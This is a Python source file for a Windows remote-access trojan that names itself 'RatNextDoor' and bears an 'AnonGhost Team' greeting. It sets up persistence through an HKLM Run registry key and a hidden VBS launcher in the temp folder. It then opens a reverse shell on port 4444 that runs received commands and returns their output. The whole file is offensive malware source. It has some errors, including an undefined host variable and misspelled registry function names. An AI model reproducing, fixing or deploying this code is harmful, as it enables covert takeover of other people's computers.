import os
import subprocess
import socket
import sys
import tempfile
from winreg import *

# Maleware to connect Windows ;)
MALWARE_NAME = 'xbytes.exe'
TRIGGER = MALWARE_NAME.replace('.exe', '') + ".vbs"
KEY_PATH = "Software\Microsoft\Windows\CurrentVersion\Run"
KEY_NAME = "anarc0der_key"
SHELL_PORT = 4444
TRIGGER_PATH = tempfile.gettempdir() + "\\" + TRIGGER
MALWARE_PATH = tempfile.gettempdir() + "\\" + MALWARE_NAME


class RatNextDoor:

    def infect_windows_register_keys(self):
        """"
        Method to register malware on windows keys. 

                Returns 
                --------
                False: if didn't have kye for maleware.
        True:  if already have key for malware
        """
        key = openKey(HKEY_LOCAL_MACHINE, KEY_PATH)
        keys = []
        try:
            i = 0
            while True:
                cur_key = EnumValue(key, i)
                keys.append(cur_key[0])
                i += 1

        except:
            pass
        if KEY_NAME not in keys:
            mlwr_key = OpenKey(HKEY_LOCAL_MACHINE, KEY_PATH, 0, KEY_ALL_ACCESS)
            SetValuEx(mlwr_key, KEY_NAME, 0, REG_SZ, TRIGGER_PATH)
            mlwr_key.Close()
            return False
        return True

    def hide_maleware_and_trigger(self):
        """Method to generate & hide the trigger and maleware

                Returns 
                --------
                True: If malware already hidden
                Flase: if wasn't hidded

        """

        if os.path.exists(MALWARE_PATH) and os.path.exists(TRIGGER_PATH):
            return True
        else:
            pay_load = 'Set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run """{0} """, 0, false'.format(
                MALWARE_PATH)
            with open(TRIGGER_PATH, 'w') as f:
                f.write(pay_load)
            os.system('copy %s %s' % (MALWARE_NAME, MALWARE_PATH))
            return False

    def revese_shell_functions(self):
        """Method of reverse shell"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((REV_SHELL, SHELL_PORT))
        s.send(
            '\n\!/ anarc0der mlwr tutorial - greetz AnonGhost Team \!/\n\n[*] If you need to finish, just type: quit\n[*] PRESS ENTER TO PROMPT\n\n')
        while True:
            data = s.recv(1024)
            if 'quit' in data:
                break
            cmd = subprocess.Popen(
                data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            saida_cmd = cmd.stdout.read() + cmd.stderr.read()
            s.send(saida_cmd)
            s.send("Comando: ")
        s.close()


def main():
    hack = []
    x = RatNextDoor()
    hack.append(x.infect_windows_register_keys())
    hack.append(x.hide_maleware_and_trigger())
    if all(res is True for res in hack):
        x.revese_shell_functions()


if __name__ == '__main__':
    main()
